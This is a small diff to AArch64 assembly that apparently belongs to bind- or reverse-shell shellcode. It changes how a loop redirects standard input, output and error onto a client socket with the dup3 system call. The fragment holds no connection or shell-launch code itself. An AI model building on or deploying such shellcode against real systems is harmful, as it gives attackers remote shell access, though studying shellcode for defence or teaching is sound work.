@@ -52,14 +52,14 @@ _start:
 
     // dup3(clientfd, [0, 1, 2])
 
-    movk x3, #0x0102
+    eor x3, xzr, 0x2
 
     dupfd:
         ldr x0, [sp, #-0x20]
         and x1, x3, #0xff
         mov x8, #0x18 // SYS_dup3
         svc #0x1337
-        lsr x3, x3, #8
+        lsr x3, x3, #1
         cmp xzr, x1
         bne dupfd
 
